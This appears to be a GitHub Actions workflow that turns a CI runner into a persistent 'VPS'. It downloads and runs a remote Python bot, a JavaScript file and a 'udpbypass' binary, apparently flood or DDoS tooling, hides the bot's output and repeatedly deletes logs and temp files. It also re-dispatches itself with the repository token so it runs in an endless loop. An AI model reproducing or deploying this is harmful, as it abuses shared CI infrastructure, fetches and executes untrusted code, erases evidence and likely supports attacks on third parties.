name: Create VPS
on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    env:
      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
    continue-on-error: true
    steps:
    - name: â¬‡ï¸ Checkout
      uses: actions/checkout@v3
    - name: ğŸ” System Info
      run: |
        echo "ğŸ–¥ï¸ System Information:"
        echo "OS: $(uname -a)"
        echo "Memory: $(free -h)"
        echo "Disk: $(df -h)"
        echo "Python: $(python3 --version)"
    - name: âš™ï¸ Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '20'
    - name: ğŸ“¦ Install & Run Bot
      run: |
        echo "ğŸ”§ Setting up Python virtual environment..."
        python3 -m venv .venv
        source .venv/bin/activate
        
        echo "ğŸ“¦ Installing Python packages..."
        pip install telebot psutil requests aiohttp paramiko rich colorama
        
        echo "ğŸ“¦ Installing Node.js packages..."
        npm install user-agents colors hpack socks chalk@2.3
        
        echo "ğŸ“¥ Downloading files..."
        wget https://github.com/Patriot-FCU-Team/hihi/raw/refs/heads/main/bot.py
        wget https://github.com/Patriot-FCU-Team/hihi/raw/refs/heads/main/raw.js
        wget https://github.com/Patriot-FCU-Team/hihi/raw/refs/heads/main/udpbypass

        chmod +x * || true
        
        echo "ğŸš€ Starting bot..."
        nohup python bot.py > /dev/null 2>&1 &
        echo "âœ… Bot is running in background..."
        
        find . -name "*.log" -delete || true
        pip cache purge || true
    - name: ğŸ”‘ Root Cleanup Attempt  # Added root cleanup
      run: |
        echo "ğŸ”‘ Attempting root cleanup for /tmp..."
        if sudo -n true 2>/dev/null; then
          echo "âœ… Sudo available - cleaning /tmp with root..."
          sudo rm -rf /tmp/systemd-private-* /tmp/snap-private-tmp 2>/dev/null || true
          sudo find /tmp -maxdepth 1 -name "*private*" -delete 2>/dev/null || true
        else
          echo "âš ï¸ Sudo not available - skipping root cleanup"
          find /tmp -maxdepth 1 -user $(whoami) -name "*private*" -delete 2>/dev/null || true
        fi
        echo "ğŸ”‘ Root attempt completed (errors ignored)"
    - name: â³ Keep VPS alive
      run: |
        echo "ğŸŸ¢ Starting VPS session..."
        for i in $(seq 1 360); do
          echo "ğŸŸ¢ Running minute $i/360..."
          if [ $((i % 5)) -eq 0 ]; then
            echo "ğŸ§¹ Periodic cleanup at minute $i..."
            find . -name "*.log" -delete || true
            rm -rf /tmp/*bot* /tmp/*.log 2>/dev/null || true
            # Thá»­ root periodic
            if sudo -n true 2>/dev/null; then
              sudo find /tmp -maxdepth 1 -name "*private*" -delete 2>/dev/null || true
            fi
          fi
          sleep 60
        done
    - name: ğŸ” Restart workflow
      if: always()
      run: |
        echo "ğŸ”„ Attempting to restart workflow..."
        sleep 30
        curl -X POST \
          -H "Accept: application/vnd.github+json" \
          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
          -H "Content-Type: application/json" \
          https://api.github.com/repos/${{ github.repository }}/dispatches \
          -d '{"event_type": "create-vps"}' || echo "âš ï¸ Failed to restart workflow"
    - name: Final Workspace Purge  # Added final root attempt
      if: always()
      run: |
        echo "ğŸ—‘ï¸ Final cleanup..."
        if sudo -n true 2>/dev/null; then
          sudo rm -rf /tmp/* 2>/dev/null || true
        fi
        rm -rf * .git .venv bot_discord/*
        find . -name "*.log" -delete 2>/dev/null || true
        rm -rf /tmp/* ~/.cache/* 2>/dev/null || true
        echo "ğŸ—‘ï¸ Workspace purged"
